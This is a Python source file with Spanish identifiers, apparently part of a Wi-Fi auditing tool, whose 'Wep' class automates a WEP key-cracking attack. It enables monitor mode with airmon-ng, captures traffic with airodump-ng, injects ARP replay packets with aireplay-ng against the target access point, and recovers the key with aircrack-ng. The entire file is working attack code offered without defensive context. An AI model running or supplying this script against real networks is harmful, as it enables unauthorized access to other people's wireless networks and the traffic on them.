import os, sys
import subprocess
import time
import pandas as pd
import commands
import signal


class Wep():
	"""docstring fos Wep"""
	def __init__(self,red):
		self._red = red

	def red(self):
		return self._red
	
	def atacar(self):
		wlan = commands.getoutput('sudo airmon-ng check kill')
		comando = 'sudo airmon-ng start wlan1 '+self.red().channel()
		wlan = commands.getoutput(comando)
		nom = self.red().bssid()
		nom = nom.replace(" ","_")
		archivo = './datos/'+nom+'/'+nom
		print('Ejecutando la captura de paquetes')
		comando = 'sudo airodump-ng --bssid '+str(self.red().essid())+' --channel '+str(self.red().channel())+' --write '+archivo+' wlan1mon'
		airodump = subprocess.Popen(comando,shell=True,preexec_fn=os.setsid)
		time.sleep(20)
		nomArchivo = archivo+'-01.csv'
		dt = pd.read_csv(nomArchivo)
		if len(dt.get_values()) < 3 :
			print('No se encontro un host para la inyeccion de paquetes')
			self.red().set_contrasena('No hay host para la inyeccion de paquetes')
			os.killpg(os.getpgid(airodump.pid),signal.SIGTERM)
		else:
			print('Ejecutando la inyeccion de paquetes')
			comando = 'sudo aireplay-ng -3 -b'+self.red().essid()+' -h '+str(dt.get_values()[2][0])+' wlan1mon'
			aireplay = subprocess.Popen(comando,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,preexec_fn=os.setsid)
			time.sleep(60)
			comando = 'sudo aircrack-ng '+archivo+'*.cap > '+archivo+'contrasena'
			print('Descifrando la contrasena')
			result = subprocess.Popen(comando,shell=True,preexec_fn=os.setsid)
			time.sleep(60)
			result.terminate()
			result.kill()
			airodump.terminate()
			airodump.kill()
			aireplay.terminate()
			aireplay.kill()
			os.killpg(os.getpgid(result.pid),signal.SIGTERM)
			os.killpg(os.getpgid(airodump.pid),signal.SIGTERM)
			os.killpg(os.getpgid(aireplay.pid),signal.SIGTERM)
			comando = 'cat '+archivo+'contrasena |grep "KEY FOUND"'
			salida = commands.getoutput(comando)
			salida = str(salida)
			print(salida)
			if salida != '':
				print('contrasena: ',salida)
				self.red().set_contrasena(salida)
			else:
				print('Caduco el tiempo del ataque, la contrasena no pudo ser descifrada')
				self.red().set_contrasena('El tiempo del ataque ha caducado y no se pudo recuperar la contrasena')
						
		commands.getoutput('sudo rm replay_arp*')
		self.habilitarWlan()


	def habilitarWlan(self):
		wlan = commands.getoutput('sudo airmon-ng stop wlan1mon')
		wlan = commands.getoutput('sudo ifconfig wlan1 up')